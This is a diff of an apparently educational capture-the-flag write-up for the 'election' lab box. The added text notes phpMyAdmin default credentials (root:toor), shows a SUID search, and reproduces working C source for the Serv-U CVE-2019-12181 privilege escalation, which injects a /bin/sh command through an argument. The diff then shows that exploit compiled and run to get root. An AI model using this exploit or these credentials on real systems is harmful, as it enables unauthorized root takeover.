@@ -80,6 +80,7 @@ Finished
 ```
 
 The `phpinfo.php` leaks the php version.
+`Edit:` After completing this box and reading some writeups, I completely missed the phpmyadmin! When I originally went to the directory I got a 403, but if you navigate to `phpmyadmin/index.php` you can login with the default creds `root:toor` and actually allows you to change the password for the `love` user (more below). While this didn't directly lead to a foodhold on the machine, it most certainly have been a huge finding had this been a pentest!
 
 ![image.png](image%203.png)
 
@@ -316,5 +317,73 @@ bc26[redacted]
 ```
 
 Boom! It worked. We are now root!
+However! Turns out this was not the intended way.
 
-In summary, we enumerated the webserver by bruteforcing directories. We found the `love` user as well as a public facing log file containing a password. The password was reused as the `love` user’s password on SSH, which had password authentication enabled. From there, we were able to abuse a vulnerable version of sudo to escalate our privileges to the root user.
+If we check for suid binaries like so:
+
+```
+love@election:~$ find / -perm -u=s -type f 2>/dev/null                                                                  /usr/bin/arping                                                                                                         /usr/bin/passwd                                                                                                         /usr/bin/pkexec                                                                                                         /usr/bin/traceroute6.iputils                                                                                            /usr/bin/newgrp                                                                                                         /usr/bin/chsh                                                                                                           /usr/bin/chfn                                                                                                           /usr/bin/gpasswd                                                                                                        /usr/bin/sudo                                                                                                           /usr/sbin/pppd                                                                                                          /usr/local/Serv-U/Serv-U                                                                                                /usr/lib/policykit-1/polkit-agent-helper-1                                                                              /usr/lib/eject/dmcrypt-get-device                                                                                       /usr/lib/openssh/ssh-keysign                                                                                            /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                             /usr/lib/xorg/Xorg.wrap                                                                                                 /bin/fusermount                                                                                                         /bin/ping
+```
+
+We get this interesting `Serv-U` file.
+
+```
+love@election:~$ cd /usr/local/Serv-U/
+love@election:/usr/local/Serv-U$ ls
+ Client                 Scripts                 Serv-U-DefaultCertificate.crt               Serv-U-Tray    uninstall
+'Custom HTML Samples'   Serv-U                  Serv-U-DefaultCertificate.key               Shares
+ Images                 Serv-U.Archive         'Serv-U Integration Sample Shared Library'   Strings
+ Legal                  Serv-U.Archive.Backup   Serv-U-StartupLog.txt                      'Tray Themes'
+love@election:/usr/local/Serv-U$
+```
+
+Doing some research, there is a [Local Privilege Escalation Exploit](https://www.exploit-db.com/exploits/47009) on our lovely exploit-db. The exploit code is short and looks like this:
+
+```
+/*
+
+CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation 
+
+vulnerability found by:
+Guy Levin (@va_start - twitter.com/va_start) https://blog.vastart.dev
+
+to compile and run:
+gcc servu-pe-cve-2019-12181.c -o pe && ./pe
+
+*/
+
+#include <stdio.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main()
+{       
+    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
+    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
+    // if execv is successful, we won't reach here
+    printf("ret val: %d errno: %d\n", ret_val, errno);
+    return errno;
+}
+```
+
+We can read about how the exploit works [Here](https://blog.vastart.dev).
+We have gcc on the machine
+
+```
+love@election:/usr/local/Serv-U$ which gcc
+/usr/bin/gcc
+```
+
+So let's transfer our exploit code, compile, and fire away!
+
+```
+love@election:/tmp$ gcc exploit.c -o pe
+love@election:/tmp$ ./pe
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
+opening root shell
+#
+```
+
+And boom! Root!
+
+In summary, we enumerated the webserver by bruteforcing directories. We found the `love` user as well as a public facing log file containing a password. The password was reused as the `love` user’s password on SSH, which had password authentication enabled. From there, we were able to both, a) abuse an outdated version of sudo to escalate our privileges using the `sudo baron samedit` exploit, or b) abuse the outdated Serv-U FTP suid executable via a shell injection vulnerability.
